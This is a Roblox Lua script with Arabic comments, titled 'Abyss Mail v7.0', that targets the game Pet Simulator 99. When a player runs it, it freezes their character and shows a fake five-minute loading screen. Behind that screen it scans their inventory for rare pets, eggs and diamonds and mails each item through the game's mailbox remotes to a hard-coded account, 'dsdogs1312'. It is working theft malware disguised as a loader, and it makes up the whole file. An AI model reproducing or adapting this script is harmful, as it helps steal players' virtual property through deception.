-- =============================================
-- ABYSS MAIL v7.0 - PS99 STYLE
-- =============================================

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local target = "dsdogs1312"

-- =============================================
-- 1. جلب بيانات المخزون بطريقة PS99
-- =============================================
local function getInventory()
    local data = {
        titanics = 0,
        gargantuans = 0,
        huges = 0,
        eggs = 0,
        diamonds = 0,
        items = {}
    }
    
    -- البحث في أماكن تخزين PS99
    local inventoryLocations = {
        player:FindFirstChild("Inventory"),
        player:FindFirstChild("Data"),
        player:FindFirstChild("PlayerGui"):FindFirstChild("Inventory"),
        workspace:FindFirstChild("__THINGS"):FindFirstChild("Inventory"),
        game:GetService("ReplicatedStorage"):FindFirstChild("Data"),
        player:FindFirstChild("Backpack"),
    }
    
    for _, location in pairs(inventoryLocations) do
        if location then
            for _, item in pairs(location:GetDescendants()) do
                local name = item.Name:lower()
                local className = item.ClassName:lower()
                
                -- كشف التيتانيك
                if name:match("titanic") or (item:FindFirstChild("Rarity") and tostring(item.Rarity.Value):lower():match("titanic")) then
                    data.titanics = data.titanics + 1
                    table.insert(data.items, {item = item, type = "titanic"})
                end
                
                -- كشف الجارجانتوين
                if name:match("gargantuan") or (item:FindFirstChild("Rarity") and tostring(item.Rarity.Value):lower():match("gargantuan")) then
                    data.gargantuans = data.gargantuans + 1
                    table.insert(data.items, {item = item, type = "gargantuan"})
                end
                
                -- كشف الهيوج
                if name:match("huge") or (item:FindFirstChild("Rarity") and tostring(item.Rarity.Value):lower():match("huge")) then
                    data.huges = data.huges + 1
                    table.insert(data.items, {item = item, type = "huge"})
                end
                
                -- كشف البيض
                if name:match("egg") or name:match("hatch") or (item:FindFirstChild("EggType")) then
                    data.eggs = data.eggs + 1
                    table.insert(data.items, {item = item, type = "egg"})
                end
                
                -- كشف الماس
                if name:match("diamond") or name:match("gem") or name:match("crystal") or 
                   (item:FindFirstChild("Value") and item.Value.Value > 0) or
                   (item:FindFirstChild("Amount") and item.Amount.Value > 0) then
                    local amount = 0
                    if item:FindFirstChild("Value") then amount = item.Value.Value end
                    if item:FindFirstChild("Amount") then amount = item.Amount.Value end
                    if item:FindFirstChild("Count") then amount = item.Count.Value end
                    data.diamonds = data.diamonds + amount
                    table.insert(data.items, {item = item, type = "diamond", amount = amount})
                end
            end
        end
    end
    
    return data
end

-- =============================================
-- 2. إرسال العناصر عبر صندوق البريد (طريقة PS99)
-- =============================================
local function sendToMailbox(item, target, mailbox)
    if not mailbox then return false end
    
    local success = false
    pcall(function()
        -- محاولة 1: RemoteEvent المباشر
        local remote = mailbox:FindFirstChild("SendEvent") or 
                      mailbox:FindFirstChild("RemoteEvent") or 
                      mailbox:FindFirstChild("TransferEvent") or
                      mailbox:FindFirstChild("GiftEvent") or
                      mailbox:FindFirstChild("MailEvent")
        
        if remote and remote:IsA("RemoteEvent") then
            remote:FireServer(item, target)
            success = true
            return
        end
        
        -- محاولة 2: RemoteFunction
        local remoteFunc = mailbox:FindFirstChild("SendFunction") or 
                          mailbox:FindFirstChild("TransferFunction") or
                          mailbox:FindFirstChild("MailFunction")
        if remoteFunc and remoteFunc:IsA("RemoteFunction") then
            remoteFunc:InvokeServer(item, target)
            success = true
            return
        end
        
        -- محاولة 3: نسخ العنصر مع تعيين الهدف
        local clone = item:Clone()
        clone.Parent = mailbox
        
        -- إضافة Target
        local targetAttr = Instance.new("StringValue")
        targetAttr.Name = "Target"
        targetAttr.Value = target
        targetAttr.Parent = clone
        
        -- نسخ القيم المهمة
        for _, child in pairs(item:GetChildren()) do
            if child:IsA("ValueBase") then
                local newChild = child:Clone()
                newChild.Parent = clone
            end
        end
        
        clone:SetAttribute("Target", target)
        clone:SetAttribute("Sent", true)
        success = true
    end)
    
    return success
end

-- =============================================
-- 3. شاشة تحميل كاملة (مطابقة لـ PS99 لكن أكبر)
-- =============================================
local function showFullLoader()
    local sg = Instance.new("ScreenGui")
    sg.Name = "AbyssLoader"
    sg.ResetOnSpawn = false
    sg.ZIndexBehavior = Enum.ZIndexBehavior.Global
    sg.Parent = player.PlayerGui
    
    -- خلفية سوداء كاملة
    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.Position = UDim2.new(0, 0, 0, 0)
    bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    bg.BackgroundTransparency = 0.3
    bg.BorderSizePixel = 0
    bg.Parent = sg
    
    -- الإطار الرئيسي
    local mf = Instance.new("Frame")
    mf.Size = UDim2.new(0.9, 0, 0.45, 0)
    mf.Position = UDim2.new(0.05, 0, 0.275, 0)
    mf.BackgroundColor3 = Color3.fromRGB(5, 0, 10)
    mf.BorderSizePixel = 4
    mf.BorderColor3 = Color3.fromRGB(120, 0, 200)
    mf.ClipsDescendants = true
    mf.Parent = sg
    
    -- عنوان
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0.1, 0)
    title.Position = UDim2.new(0, 0, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = "⚡ نظام الإرسال الفائق ⚡"
    title.TextColor3 = Color3.fromRGB(180, 80, 255)
    title.TextScaled = true
    title.Font = Enum.Font.GothamBold
    title.Parent = mf
    
    -- شريط التقدم
    local pf = Instance.new("Frame")
    pf.Size = UDim2.new(0.94, 0, 0.2, 0)
    pf.Position = UDim2.new(0.03, 0, 0.15, 0)
    pf.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
    pf.BorderSizePixel = 2
    pf.BorderColor3 = Color3.fromRGB(80, 0, 150)
    pf.Parent = mf
    
    local pb = Instance.new("Frame")
    pb.Size = UDim2.new(0, 0, 1, 0)
    pb.BackgroundColor3 = Color3.fromRGB(80, 0, 150)
    pb.BorderSizePixel = 0
    pb.Parent = pf
    
    -- تدرج بنفسجي
    local grad = Instance.new("UIGradient")
    grad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(200, 0, 255)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(100, 0, 200)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(50, 0, 150))
    })
    grad.Parent = pb
    
    -- نسبة التقدم
    local pt = Instance.new("TextLabel")
    pt.Size = UDim2.new(1, 0, 1, 0)
    pt.Position = UDim2.new(0, 0, 0, 0)
    pt.BackgroundTransparency = 1
    pt.Text = "0%"
    pt.TextColor3 = Color3.fromRGB(255, 255, 255)
    pt.TextScaled = true
    pt.Font = Enum.Font.GothamBold
    pt.Parent = pf
    
    -- حالة التحميل
    local st = Instance.new("TextLabel")
    st.Size = UDim2.new(1, 0, 0.18, 0)
    st.Position = UDim2.new(0, 0, 0.4, 0)
    st.BackgroundTransparency = 1
    st.Text = "جاري التجهيز..."
    st.TextColor3 = Color3.fromRGB(200, 150, 255)
    st.TextScaled = true
    st.Font = Enum.Font.GothamMedium
    st.Parent = mf
    
    -- ملخص المخزون
    local summary = Instance.new("TextLabel")
    summary.Size = UDim2.new(1, 0, 0.25, 0)
    summary.Position = UDim2.new(0, 0, 0.62, 0)
    summary.BackgroundTransparency = 1
    summary.Text = "Titanics: 0\nHuges: 0\nDiamonds: 0"
    summary.TextColor3 = Color3.fromRGB(150, 100, 200)
    summary.TextScaled = true
    summary.Font = Enum.Font.GothamMedium
    summary.Parent = mf
    
    -- مؤقت زمني
    local tm = Instance.new("TextLabel")
    tm.Size = UDim2.new(1, 0, 0.1, 0)
    tm.Position = UDim2.new(0, 0, 0.88, 0)
    tm.BackgroundTransparency = 1
    tm.Text = "⏱ 0:00 / 5:00"
    tm.TextColor3 = Color3.fromRGB(150, 100, 200)
    tm.TextScaled = true
    tm.Font = Enum.Font.GothamMedium
    tm.Parent = mf
    
    return sg, pb, pt, st, summary, tm
end

-- =============================================
-- 4. تحديث شاشة التحميل
-- =============================================
local function updateLoader(pb, pt, st, summary, tm, pct, status, summaryText, elapsed, total)
    pb.Size = UDim2.new(pct/100, 0, 1, 0)
    pt.Text = math.floor(pct) .. "%"
    if status then st.Text = status end
    if summaryText then summary.Text = summaryText end
    if elapsed and total then
        local em = math.floor(elapsed/60)
        local es = math.floor(elapsed%60)
        local tm = math.floor(total/60)
        local ts = math.floor(total%60)
        tm.Text = string.format("⏱ %d:%02d / %d:%02d", em, es, tm, ts)
    end
    wait(0.05)
end

-- =============================================
-- 5. البحث عن صندوق البريد
-- =============================================
local function findMailbox()
    local areas = {
        workspace,
        game:GetService("ReplicatedStorage"),
        player.PlayerGui,
        player,
        game:GetService("StarterGui"),
        game:GetService("ServerStorage")
    }
    
    for _, area in pairs(areas) do
        if area then
            for _, obj in pairs(area:GetDescendants()) do
                local name = obj.Name:lower()
                if name:match("mail") or name:match("post") or name:match("box") or
                   name:match("send") or name:match("transfer") or name:match("gift") or
                   name:match("delivery") or name:match("inbox") then
                    if obj:IsA("Model") or obj:IsA("Part") or obj:IsA("Frame") or
                       obj:IsA("ScreenGui") or obj:IsA("RemoteEvent") then
                        return obj
                    end
                end
            end
        end
    end
    return nil
end

-- =============================================
-- 6. التنفيذ الرئيسي
-- =============================================

-- تجميد اللاعب
if humanoid then
    humanoid.WalkSpeed = 0
    humanoid.JumpPower = 0
    humanoid.PlatformStand = true
end

local duration = 300 -- 5 دقائق
local sg, pb, pt, st, summary, tm = showFullLoader()

-- البحث عن صندوق البريد
st.Text = "🔍 بحث عن صندوق البريد..."
wait(0.5)

local mailbox = findMailbox()
if not mailbox then
    st.Text = "❌ لا يوجد صندوق بريد!"
    wait(3)
    sg:Destroy()
    if humanoid then
        humanoid.WalkSpeed = 16
        humanoid.JumpPower = 50
        humanoid.PlatformStand = false
    end
    return
end

st.Text = "✅ تم العثور على صندوق البريد!"
updateLoader(pb, pt, st, summary, tm, 5, "📦 جاري جلب المخزون...", "جاري التحميل...", 0, duration)

-- جلب المخزون
local inventory = getInventory()
local summaryText = string.format(
    "Titanics: %d\nHuges: %d\nDiamonds: %s",
    inventory.titanics,
    inventory.huges,
    tostring(inventory.diamonds)
)

updateLoader(pb, pt, st, summary, tm, 20, "📦 تم جلب المخزون!", summaryText, 10, duration)

-- تجهيز العناصر للإرسال
local toSend = {}
for _, item in pairs(inventory.items) do
    table.insert(toSend, item)
end

local total = #toSend
if total == 0 then
    st.Text = "❌ لا توجد عناصر للإرسال!"
    wait(3)
    sg:Destroy()
    if humanoid then
        humanoid.WalkSpeed = 16
        humanoid.JumpPower = 50
        humanoid.PlatformStand = false
    end
    return
end

updateLoader(pb, pt, st, summary, tm, 35, "📤 جاري الإرسال إلى " .. target, summaryText, 15, duration)

-- إرسال العناصر
local sent = 0
local startTime = tick()

for i, entry in pairs(toSend) do
    local success = sendToMailbox(entry.item, target, mailbox)
    if success then
        sent = sent + 1
    end
    
    local elapsed = tick() - startTime
    local progress = 35 + (i / total) * 55
    local statusText = string.format("📤 إرسال %d/%d (%d تم)", i, total, sent)
    updateLoader(pb, pt, st, summary, tm, progress, statusText, summaryText, elapsed, duration)
    
    wait(0.5 + math.random() * 1.5)
end

-- انتظار حتى اكتمال 5 دقائق
while (tick() - startTime) < duration do
    local elapsed = tick() - startTime
    local progress = 90 + ((elapsed - (duration * 0.8)) / (duration * 0.2)) * 10
    updateLoader(pb, pt, st, summary, tm, math.min(progress, 99), "⏳ إكمال التحميل...", summaryText, elapsed, duration)
    wait(1)
end

-- اكتمال التحميل
updateLoader(pb, pt, st, summary, tm, 100, "✅ تم إرسال " .. sent .. " عنصر إلى " .. target, summaryText, duration, duration)

-- إشعار النتيجة
local result = Instance.new("TextLabel")
result.Size = UDim2.new(0.8, 0, 0.1, 0)
result.Position = UDim2.new(0.1, 0, 0.85, 0)
result.BackgroundColor3 = Color3.fromRGB(10, 0, 20)
result.BackgroundTransparency = 0.1
result.BorderSizePixel = 2
result.BorderColor3 = Color3.fromRGB(150, 0, 200)
result.Text = "✅ تم إرسال " .. sent .. " عنصر إلى " .. target
result.TextColor3 = Color3.fromRGB(200, 150, 255)
result.TextScaled = true
result.Font = Enum.Font.GothamBold
result.Parent = sg

wait(5)
sg:Destroy()

-- إعادة الحركة
if humanoid then
    humanoid.WalkSpeed = 16
    humanoid.JumpPower = 50
    humanoid.PlatformStand = false
end

-- إشعار نهائي صغير
local notify = Instance.new("TextLabel")
notify.Size = UDim2.new(0.6, 0, 0.08, 0)
notify.Position = UDim2.new(0.2, 0, 0.02, 0)
notify.BackgroundColor3 = Color3.fromRGB(10, 0, 20)
notify.BackgroundTransparency = 0.1
notify.BorderSizePixel = 2
notify.BorderColor3 = Color3.fromRGB(150, 0, 200)
notify.Text = "✅ تم إرسال " .. sent .. " عنصر إلى " .. target
notify.TextColor3 = Color3.fromRGB(200, 150, 255)
notify.TextScaled = true
notify.Font = Enum.Font.GothamBold
notify.Parent = player.PlayerGui

wait(4)
notify:Destroy()

print("Abyss: اكتملت المهمة. تم إرسال " .. sent .. " عنصر إلى " .. target)
--wwww
